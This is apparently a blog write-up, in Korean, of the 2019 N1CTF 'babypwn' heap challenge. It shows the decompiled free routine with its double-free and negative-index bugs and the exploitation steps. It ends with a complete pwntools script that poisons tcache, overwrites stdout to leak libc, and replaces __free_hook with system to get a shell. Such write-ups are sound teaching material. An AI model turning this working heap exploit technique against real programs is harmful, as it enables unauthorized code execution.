---
title: N1CTF babypwn write up
categories: [2019, N1CTF]
tags: [CTF, pwn, heap]
---

N1CTF babypwn write up  

subject   | problem
----------|------------
CTF       | 2019 N1CTF
Tags      | pwn
score     | 400
env       | ubuntu 18.04
problem   | heap, doublefree, stdbuf

# analysis 

throw 부분에서 취약점이 발생한다.

``` c++
unsigned __int64 Throwhim()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("index:");
  v1 = readInt();
  if ( v1 > 9 )
  {
    puts("invalid index!");
    exit(0);
  }
  free(*((void **)buf[v1] + 2));
  return __readfsqword(0x28u) ^ v2;
}
```

취약점은 두개 존재하는데, v1에 -를 넣을수 있다는 점과 double free가 발생한다는 점이다
double free 취약점 만으로 이 문제를 풀 수 있다.
warm up과 차이점은 edit가 없다는 것이다.

# Solve

PIE가 갈려있지 않으므로 warm up 처럼 부르트 포싱을 할 필요없이 tcache를 bss의 stdout을 가리키게 하면 쉽게 stdout을 덮을 수 있다.

1. malloc을 한후 doublefree
2. tcache의 fd를 bss stdout을 가리키게 함
3. stdout을 덮어서 릭
4. free_hook를 system주소로 덮어서 get shell

# exploit

``` python
#!/usr/bin/env/python
# powerprove

from pwn import *
import sys

if len(sys.argv) < 2:
    host = "localhost"
    port =4000

def inp(data, line = 1):
    s.recvuntil(":")
    if line == 1:
        s.sendline(str(data))
    else:
        s.send(str(data))

def menu(index):
    inp(str(index))

def addMember(name, size, data, nameline = 1, dataline = 1):
    menu(1)
    inp(name, nameline)
    inp(str(size))
    inp(data, dataline)

def throw(index):
    menu(2)
    inp(str(index))

def pwn():
    addMember("POWERPROVE", 40, "AAAAAAAAAA")
    
    for i in range(0, 4):
        throw(0)
    
    addMember(p64(0x000000000602020), 40, p64(0x000000000602020))

    payload = p64(0x0fbad1800)
    payload += p64(0)*3
    payload += "\x00"
    addMember("\x60", 40, payload, nameline = 0, dataline = 0)

    s.recv(8)
    libc_base = u64(s.recv(8)) - 0x3ed8b0
    system_addr = libc_base + 0x4f440
    free_hook = libc_base + 0x3ed8e8

    log.info("libc_base        : " + str(hex(libc_base)))
    log.info("system_addr      : " + str(hex(system_addr)))
    log.info("free_hook        : " + str(hex(free_hook)))

    for i in range(0, 3):
        throw(0)
    
    addMember(p64(free_hook), 40, p64(free_hook))
    addMember(p64(system_addr), 200, "/bin/sh\x00")

    throw(4)


if __name__ == "__main__":
    s = remote(host, port)
    pwn()
    s.interactive()
```